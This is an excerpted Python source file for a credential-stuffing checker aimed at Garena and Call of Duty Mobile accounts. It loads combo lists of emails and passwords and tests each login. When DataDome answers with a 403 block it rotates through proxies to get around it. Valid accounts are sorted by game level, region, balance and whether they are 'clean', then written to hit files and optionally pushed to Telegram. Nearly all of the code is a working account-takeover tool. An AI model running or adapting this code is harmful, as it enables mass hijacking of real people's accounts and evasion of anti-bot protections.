...
class _BotModeLogger:
    """Wrapper that suppresses per-account spam when BOT_MODE is True.
    Only lets through CRITICAL-level messages."""
    def __init__(self, real_logger):
        self._real = real_logger
    def debug(self, *a, **kw): 
        if not BOT_MODE: self._real.debug(*a, **kw)
    def info(self, *a, **kw): 
        if not BOT_MODE: self._real.info(*a, **kw)
    def warning(self, *a, **kw): 
        if not BOT_MODE: self._real.warning(*a, **kw)
    def error(self, *a, **kw): 
        if not BOT_MODE: self._real.error(*a, **kw)
    def critical(self, *a, **kw): 
        self._real.critical(*a, **kw)
...
# Global live_stats reference so signal_handler can access it before exit
_global_live_stats = None
# Global file encoding used when loading combo — so auto-remove uses same encoding
_combo_file_encoding = 'utf-8'
# Auto-remove: in-memory tracking — no per-line full-file rewrite
_auto_remove_enabled = False
_combo_filename      = None
_all_accounts        = []        # full original list (strings)
_checked_accounts    = set()     # accounts already checked (account_line strings)
_checked_lock        = None      # protects _checked_accounts
_batch_flush_counter = [0]       # how many checks since last flush
BATCH_FLUSH_EVERY    = 10        # rewrite file every N completed checks

def _flush_remaining_to_file():
    """Write unchecked accounts back to the combo file. Call with _checked_lock held."""
    try:
        enc = _combo_file_encoding
        remaining = [a for a in _all_accounts if a not in _checked_accounts]
        with open(_combo_filename, "w", encoding=enc) as f:
            for line in remaining:
                f.write(line + "\n")
        return len(remaining)
    except Exception as ex:
        logger.warning(f"[AUTO-REMOVE] Flush failed: {ex}")
        return -1
...
class GeoRotator:
    ...
    def _load_file(self, idx):
                ...
                for line in f:
                    ...
                    if "://" not in line:
                        ...
                        if len(parts) == 4:
                            ...
                            _host, _port, _user, _pass = parts
                            line = f"http://{_user}:{_pass}@{_host}:{_port}"
                        elif len(parts) == 3 and "@" in parts[0]:
                            # user:pass@host:port — already correct, just add scheme
                            line = "http://" + line
                        else:
                            # Bare host:port — default to http
                            line = "http://" + line
                    else:
                        # Normalise socks → socks5 alias
        ...
        if proxies:
            ...
            self._thread_idx = {}
            # Count proxy types for informational log
            type_counts = {}
            for p in proxies:
                s = p.split("://")[0].lower()
            ...
            logging.getLogger(__name__).info(
                f"[GEO] ✅ {len(proxies)} proxies from {os.path.basename(filepath)} [{type_summary}]"
            )
            return True
        logging.getLogger(__name__).warning(
    ...
    def get_proxies(self):
        ...
        if scheme in ("socks4", "socks4a", "socks5", "socks5h"):
            # requests routes SOCKS via the URL scheme on both http and https traffic
...
def signal_handler(signum, frame):
    """Handle Ctrl+C — flush remaining accounts then show stats and exit"""
    print(f"\n")
    print(f"  {Colors.LIGHTCYAN_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}")
    print(f"  {Colors.YELLOW}⚠️  Interrupted — saving progress to file...{Colors.RESET}")
    print(f"  {Colors.LIGHTCYAN_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}")
    print()
    if _auto_remove_enabled and _combo_filename and _checked_lock:
        try:
            with _checked_lock:
                remaining = _flush_remaining_to_file()
            if remaining >= 0:
                print(f"  {Colors.GREEN}✔ {len(_checked_accounts)} checked removed — {remaining} lines left in file{Colors.RESET}")
        except Exception as ex:
            print(f"  {Colors.YELLOW}⚠️  Could not save progress: {ex}{Colors.RESET}")
    if _global_live_stats is not None:
        try:
            print(_global_live_stats.display_stats(), flush=True)
            _global_live_stats.display_rich_summary()
        except Exception:
            pass
...
logger = _BotModeLogger(logging.getLogger())
logging.getLogger(__name__).setLevel(logging.CRITICAL if BOT_MODE else logging.DEBUG)
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.WARNING if BOT_MODE else logging.DEBUG)
...
class DataDomeManager:
    ...
    def handle_403(self, session, telegram_config=None, rotator=None):
        """On EVERY 403 — immediately force-rotate proxy, refresh DataDome, resume."""
        _rotator = rotator if rotator is not None else geo_rotator
        self._403_attempts += 1

        old_proxy = _rotator.current_proxy
        ...
        new_proxy = _rotator.force_rotate()
        session.proxies.update(_rotator.get_proxies())
...
class LiveStats:
    def __init__(self, total_accounts=0):
        self.valid_count = 0
        ...
        self.level_below_100 = 0
        self.level_100_249 = 0
        self.level_250_349 = 0
        self.level_350_plus = 0
        self.total_level_sum = 0
        self.level_min = None
        self.level_max = None
        self.total_with_level = 0
        # Server/region tracking
        self.server_counts = {}
        # Auto progress tracking
        self.start_time = time.time()
        self.last_auto_display = 0
        self.auto_display_interval = 5.0  # seconds
        
    def update_stats(self, valid=False, clean=False, has_codm=False, codm_level=None, region=None):
        with self.lock:
            ...
            if valid:
                ...
                if has_codm:
                    ...
                    if codm_level is not None:
                        try:
                            lvl = int(codm_level)
                            self.total_level_sum += lvl
                            self.total_with_level += 1
                            if self.level_min is None or lvl < self.level_min:
                                self.level_min = lvl
                            if self.level_max is None or lvl > self.level_max:
                                self.level_max = lvl
                            if lvl < 100:
                                self.level_below_100 += 1
                            elif lvl < 250:
                                self.level_100_249 += 1
                            elif lvl < 350:
                                self.level_250_349 += 1
                            else:
                                self.level_350_plus += 1
                        except (ValueError, TypeError):
                            pass
                    # Track server/region
                    if region and str(region).strip() and str(region).strip().upper() not in ('N/A', 'NONE', ''):
                        r = str(region).strip().upper()
                        self.server_counts[r] = self.server_counts.get(r, 0) + 1
                else:
    ...
    def should_auto_display(self):
        """Returns True if auto display interval has passed"""
        with self.lock:
            elapsed = time.time() - self.start_time
            if elapsed - self.last_auto_display >= self.auto_display_interval:
                self.last_auto_display = elapsed
                return True
            return False
    ...
    def get_stats(self):
        with self.lock:
            return {
                ...
                'level_below_100': self.level_below_100,
                'level_100_249': self.level_100_249,
                'level_250_349': self.level_250_349,
                'level_350_plus': self.level_350_plus,
                'total_level_sum': self.total_level_sum,
                'total_with_level': self.total_with_level,
    ...
    def display_stats(self, auto_progress=False):
        ...
        # Calculate progress percentage and ETA for auto progress
        progress_pct = (total / total_accounts * 100) if total_accounts > 0 else 0
        elapsed = time.time() - self.start_time
        avg_time_per_check = elapsed / total if total > 0 else 0
        remaining = total_accounts - total
        eta_seconds = remaining * avg_time_per_check if remaining > 0 and avg_time_per_check > 0 else 0
        ...
        if auto_progress:
            ...
            return (
                f"\n{cyan}╔═══════════════════════════════════════════════════════════════════╗{reset}\n"
                f"{cyan}║{reset}  {yellow}📊 AUTO PROGRESS{reset}                                              {cyan}║{reset}\n"
                f"{cyan}╠═══════════════════════════════════════════════════════════════════╣{reset}\n"
                f"{cyan}║{reset}  [{green}{bar}{reset}] {green}{progress_pct:5.1f}%{reset}                              {cyan}║{reset}\n"
                f"{cyan}║{reset}  {white}Checked: {magenta}{total:>6}{reset} {gray}│{reset} {white}Remaining: {red}{remaining:>6}{reset} {gray}│{reset} {white}Total: {blue}{total_accounts:>6}{reset}  {cyan}║{reset}\n"
                f"{cyan}║{reset}  {green}Valid: {stats['valid']:>4}{reset} {gray}│{reset} {red}Invalid: {stats['invalid']:>4}{reset} {gray}│{reset} {yellow}ETA: {format_eta(eta_seconds):>8}{reset}         {cyan}║{reset}\n"
                f"{cyan}╚═══════════════════════════════════════════════════════════════════╝{reset}\n"
            )
        else:
            return (
                f"\n{cyan}╔═══════════════════════════════════════════════════════════════════╗{reset}\n"
                f"{cyan}║{reset}  {yellow}LIVE STATISTICS{reset} {gray}|{reset} {white}zyblahblah{reset}                              {cyan}║{reset}\n"
                f"{cyan}╠═══════════════════════════════════════════════════════════════════╣{reset}\n"
    ...
    def display_rich_summary(self):
        """Display the rich level distribution and top servers table (like the screenshot)."""
        stats = self.get_stats()
        total_codm = stats['has_codm']
        if total_codm == 0:
            return

        avg_level = (stats['total_level_sum'] / stats['total_with_level']) if stats['total_with_level'] > 0 else 0
        lmin = stats['level_min'] if stats['level_min'] is not None else 0
        lmax = stats['level_max'] if stats['level_max'] is not None else 0

        # Header panel
        header_table = Table(
            show_header=False, box=DOUBLE, border_style='cyan',
            width=80, padding=(0, 1)
        )
        header_table.add_column(style='bold cyan', justify='center')
        header_table.add_column(style='bold cyan', justify='center')
        header_table.add_column(style='bold red', justify='center')
        header_table.add_row(
            f"Total Accounts: [bold white]{total_codm}[/bold white]",
            f"Average Level: [bold white]{avg_level:.1f}[/bold white]",
            f"Range: [bold white]{lmin} – {lmax}[/bold white]"
        )
        ...
        level_table.add_column("Category", style="bold yellow", min_width=12)
        level_table.add_column("Count", style="bold white", justify="right", min_width=6)
        level_table.add_column("Percentage", style="bold cyan", justify="right", min_width=10)
        level_table.add_column("Visual", min_width=30)

        level_data = [
            ("350-400", stats['level_350_plus']),
            ("250-349", stats['level_250_349']),
            ("100-249", stats['level_100_249']),
            ("Below 100", stats['level_below_100']),
        ]
        for label, count in level_data:
            pct = (count / total_codm * 100) if total_codm > 0 else 0
            bar_len = int(pct / 3.5)
            bar = f"[bold cyan]{'█' * bar_len}[/bold cyan]"
            level_table.add_row(label, str(count), f"{pct:.1f}%", bar)
        console.print(level_table)

        # Top Servers
        if stats['server_counts']:
            server_table = Table(
                title="🌐 Top Servers",
                title_style="bold cyan",
                box=DOUBLE,
            ...
            server_table.add_column("Server", style="bold cyan", min_width=20)
            server_table.add_column("Count", style="bold white", justify="right", min_width=6)
            server_table.add_column("Percentage", style="bold cyan", justify="right", min_width=10)
            server_table.add_column("Visual", min_width=30)

            SERVER_NAMES = {
                'PH': 'Philippines (PH)', 'ID': 'Indonesia (ID)', 'TH': 'Thailand (TH)',
                'VN': 'Vietnam (VN)', 'MY': 'Malaysia (MY)', 'SG': 'Singapore (SG)',
                'TW': 'Taiwan (TW)', 'MM': 'Myanmar (MM)', 'KH': 'Cambodia (KH)',
            }
            sorted_servers = sorted(stats['server_counts'].items(), key=lambda x: x[1], reverse=True)
            for code, count in sorted_servers[:8]:
                pct = (count / total_codm * 100) if total_codm > 0 else 0
                bar_len = int(pct / 3.5)
                bar = f"[bold cyan]{'█' * bar_len}[/bold cyan]"
                name = SERVER_NAMES.get(code, code)
                server_table.add_row(name, str(count), f"{pct:.1f}%", bar)
...
def prelogin(session, account, datadome_manager, telegram_config=None, rotator=None):
    _rotator = rotator if rotator is not None else geo_rotator
    ...
    for attempt in range(retries):
        try:
            ...
            if response.status_code == 403:
                ...
                if datadome_manager.handle_403(session, telegram_config=telegram_config, rotator=_rotator):
...
def parse_account_details(data):
    ...
    # ── Facebook info (same logic as dec_taji) ────────────────────────
    fb_username = "N/A"
    fb_uid = "N/A"
    ...
    # ── Shell balance — try every known key the API may return ────────
    shell_balance = (
        user_info.get('shell')
        or user_info.get('shells')
        or user_info.get('shell_balance')
        or user_info.get('garena_shell')
        or user_info.get('cash')
        or 0
    )
...
def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, result_folder='Results', telegram_config=None, level_filter_min=0, level_filter_max=9999, single_file_path=None, rotator=None):
    _rotator = rotator if rotator is not None else geo_rotator
    try:
        ...
        for ip_block_attempt in range(MAX_IP_BLOCK_RETRIES):
            ...
            v1, v2, new_datadome = prelogin(session, account, datadome_manager, telegram_config=telegram_config, rotator=_rotator)
        ...
        # ── Level filter: skip saving if outside requested range ──
        _codm_lvl_val = 0
        try:
            _codm_lvl_val = int(str(codm_info.get('codm_level', 0)).strip())
        except Exception:
            pass
        _in_level_range = (level_filter_min <= _codm_lvl_val <= level_filter_max)

        if not _in_level_range:
            # Still update stats, but don't save to files
            live_stats.update_stats(
                valid=True, clean=details['is_clean'], has_codm=has_codm,
                codm_level=codm_info.get('codm_level') if has_codm else None,
                region=codm_info.get('region') if has_codm else None
            )
        else:
            if single_file_path:
                # ── Single file mode: save only account:pass + level info ──
                try:
                    _lvl = codm_info.get('codm_level', 'N/A') if has_codm else 'N/A'
                    _nick = codm_info.get('codm_nickname', 'N/A') if has_codm else 'N/A'
                    _reg = codm_info.get('region', 'N/A') if has_codm else 'N/A'
                    _uid = codm_info.get('uid', 'N/A') if has_codm else 'N/A'
                    _clean_tag = 'CLEAN' if details.get('is_clean') else 'NOT CLEAN'
                    _line = (
                        f"{account}:{password} | Level: {_lvl} | Nickname: {_nick} "
                        f"| Region: {_reg} | UID: {_uid} | Status: {_clean_tag}\n"
                    )
                    os.makedirs(os.path.dirname(os.path.abspath(single_file_path)), exist_ok=True)
                    with threading.Lock():
                        pass  # file_lock is outer scope; use append which is atomic enough per line
                    with open(single_file_path, 'a', encoding='utf-8') as _sf:
                        _sf.write(_line)
                except Exception as _e:
                    logger.warning(f"[SINGLE-FILE] Failed to write: {_e}")
            else:
                save_account_details_full(account, details, codm_info if has_codm else None, password, result_folder)
                save_clean_or_notclean(account, password, details, codm_info if has_codm else None, result_folder)
...
""".strip()
        ...
        if telegram_config:
            ...
            if tg_token and tg_chat and any(lvl >= t for t in thr_list) and clean_pass:
...
def select_input_file():
    ...
    _lines_str = f"{selected_file['lines']:,}"
    print(f"{CYAN}║{RESET}  {WHITE}Lines: {MAGENTA}{_lines_str}{' ' * (40 - len(_lines_str))}{RESET} {CYAN}║{RESET}")
    print(f"{CYAN}╚{'═' * 50}╝{RESET}")
    print()
...
def create_thread_session(cookie_manager, datadome_manager, rotator=None):
    ...
    sess.proxies.update(_rotator.get_proxies())
...
def main():
    global _global_live_stats, _combo_file_encoding
    ...
    # ── Level filter ──────────────────────────────────────────
    LEVEL_FILTER_MIN = 0
    LEVEL_FILTER_MAX = 9999
    LEVEL_SINGLE_FILE = False
    LEVEL_SINGLE_FILE_PATH = None
    level_filter_input = console.input(
        "[cyan]🎯 Save only specific level range? (e.g. 200-400, or press ENTER for all): [/cyan]"
    ).strip()
    if level_filter_input and '-' in level_filter_input:
        try:
            parts = level_filter_input.split('-')
            LEVEL_FILTER_MIN = int(parts[0].strip())
            LEVEL_FILTER_MAX = int(parts[1].strip())
            console.print(f"[green]✔ Level filter: {LEVEL_FILTER_MIN}–{LEVEL_FILTER_MAX} only[/green]")
            # Ask single file option only when a filter is set
            single_choice = console.input(
                f"[cyan]📄 Save {LEVEL_FILTER_MIN}–{LEVEL_FILTER_MAX} hits to a single file? (y/N): [/cyan]"
            ).strip().lower()
            if single_choice == 'y':
                LEVEL_SINGLE_FILE = True
                _sf_name = f"hits_{LEVEL_FILTER_MIN}-{LEVEL_FILTER_MAX}.txt"
                LEVEL_SINGLE_FILE_PATH = os.path.join(result_folder, _sf_name)
                console.print(f"[green]✔ Single file mode → {_sf_name}[/green]")
            else:
                console.print(f"[green]✔ Folder structure mode (normal)[/green]")
        except Exception:
            console.print(f"[yellow]⚠️  Invalid format — saving all levels[/yellow]")
            LEVEL_FILTER_MIN, LEVEL_FILTER_MAX = 0, 9999
    else:
        console.print(f"[green]✔ Level filter: ALL levels[/green]")
    ...
    live_stats     = LiveStats(total_accounts=total_accounts)
    _global_live_stats = live_stats
    print_lock     = threading.Lock()
    checked_lock   = threading.Lock()

    # Expose globals needed by signal_handler for Ctrl+C batch flush
    global _auto_remove_enabled, _combo_filename, _checked_lock
    _auto_remove_enabled = AUTO_REMOVE_CHECKED
    _checked_lock        = checked_lock

    # Shared datadome manager — thread-safe via its own lock
    shared_datadome_manager = DataDomeManager()

    if not BOT_MODE: logger.info(f"[GEO] Proxy rotator active → {geo_rotator.current_proxy} ({geo_rotator.total} proxies) | Folder: ./{PROXY_FOLDER}/")

    # Load accounts — try multiple encodings, save the one that worked
    accounts = []
    ...
    for encoding in encodings_to_try:
        try:
            ...
            _combo_file_encoding = encoding  # save for auto-remove
    ...
    # Expose for signal_handler batch flush
    global _all_accounts
    _all_accounts    = list(accounts)   # full original list
    _combo_filename  = filename
    ...
    def get_thread_session():
        ...
        if not hasattr(thread_local, 'session'):
            ...
            with thread_init_lock:
                time.sleep(0.15)  # Reduced stagger for faster init
            dm = DataDomeManager()
            thread_local.session = create_thread_session(cookie_manager, dm)
            thread_local.datadome_manager = dm
            # Lock in this thread's proxy — assigned by geo_rotator's _get_thread_idx()
            # DO NOT re-fetch from geo_rotator here; the proxy is already set on the session
        # On subsequent calls: keep the SAME proxy for this thread.
        # The proxy was locked in when the session was created.
        # Only force_rotate() (triggered by handle_403) should change it.
    ...
    def process_one(idx_line):
        ...
        try:
            ...
            # Removed per-account print to reduce I/O overhead and speed up checking

            result = processaccount(
                sess, account, password,
                cookie_manager, dm, live_stats,
                result_folder, telegram_config=telegram_config,
                level_filter_min=LEVEL_FILTER_MIN,
                level_filter_max=LEVEL_FILTER_MAX,
                single_file_path=LEVEL_SINGLE_FILE_PATH,
                rotator=geo_rotator
            )

            with print_lock:
                if result and not BOT_MODE:
                    print(result)
                if not BOT_MODE:
                    print(f"\n  {Colors.LIGHTCYAN_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}\n")
                completed[0] += 1
                # Auto progress display every 5 seconds
                if live_stats.should_auto_display() and not BOT_MODE:
                    print(live_stats.display_stats(auto_progress=True), flush=True)
                elif live_stats.should_display() and not BOT_MODE:
                    print(live_stats.display_stats(auto_progress=False), flush=True)

            # ── Mark checked and batch-flush every N accounts ──
            if AUTO_REMOVE_CHECKED:
                with checked_lock:
                    _checked_accounts.add(account_line)
                    _batch_flush_counter[0] += 1
                    if _batch_flush_counter[0] >= BATCH_FLUSH_EVERY:
                        _batch_flush_counter[0] = 0
                        _flush_remaining_to_file()
    ...
    # ── Final flush — write remaining unchecked accounts back to file ──
    if AUTO_REMOVE_CHECKED:
        with checked_lock:
            remaining = _flush_remaining_to_file()
        if remaining >= 0:
            console.print(f"[green]✔ Auto-remove done — {len(_checked_accounts)} removed, {remaining} lines left[/green]")
    ...
    console.print(f"[cyan]{'═' * 75}[/cyan]")
    # Display rich level + server summary
    live_stats.display_rich_summary()
